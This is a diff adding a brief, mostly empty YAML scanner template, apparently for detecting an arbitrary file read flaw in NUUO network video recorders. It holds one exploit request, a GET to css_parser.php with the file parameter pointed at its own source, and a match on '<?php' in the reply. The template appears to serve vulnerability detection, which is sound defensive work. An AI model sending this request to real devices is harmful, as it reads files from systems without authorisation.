@@ -1,0 +1,16 @@
+id:
+info:
+  name: NUUO网络视频录像机 css_parser.php 任意文件读取
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /css_parser.php?css=css_parser.php
+response1:
+  headers:
+  body: <?php
+  code: 200
+requests2:
+response2:
